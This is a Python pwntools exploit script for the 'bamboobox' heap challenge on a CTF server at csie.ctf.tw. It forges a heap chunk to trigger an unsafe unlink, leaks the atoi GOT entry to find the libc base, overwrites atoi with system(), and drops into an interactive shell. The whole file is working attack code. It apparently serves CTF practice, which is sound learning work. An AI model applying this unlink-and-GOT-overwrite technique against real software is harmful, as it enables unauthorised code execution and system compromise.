#!/usr/bin/env python

from pwn import *

r = remote("csie.ctf.tw", 10138)
# r = process('./bamboobox')

context.arch = 'amd64'

def show():
    r.sendafter(':', '1')

def add(length, name):
    r.sendafter(':', '2')
    r.sendafter(':', str(length))
    r.sendafter(':', name)

def change(idx, length, name):
    r.sendafter(':', '3')
    r.sendafter(':', str(idx))
    r.sendafter(':', str(length))
    r.sendafter(':', name)

def remove(idx):
    r.sendafter(':', '4')
    r.sendafter(':', str(idx))

add(0x80, 'a') # 0
add(0x80, 'a') # 1
add(0x80, 'a') # 2

chunk = flat([0, 0x81]) # prev_size, size
chunk += flat([0x6020d8 - 0x18, 0x6020d8 - 0x10]) # fd, bk
chunk += 'a' * (0x80 - 0x20)
chunk += flat([0x80, 0x90]) # prev_size_2, size_2

change(1, 0x100, chunk)
remove(2)

atoi_got = 0x602068

change(1, 0x100, flat([0, atoi_got]))
show()
r.recvuntil('0 : ')
libc = u64(r.recvuntil('1')[:-1].ljust(8, '\x00')) - 0x36e80
log.info("libc:", hex(libc))

system = libc + 0x45390
change(0, 0x100, p64(system))

r.interactive()
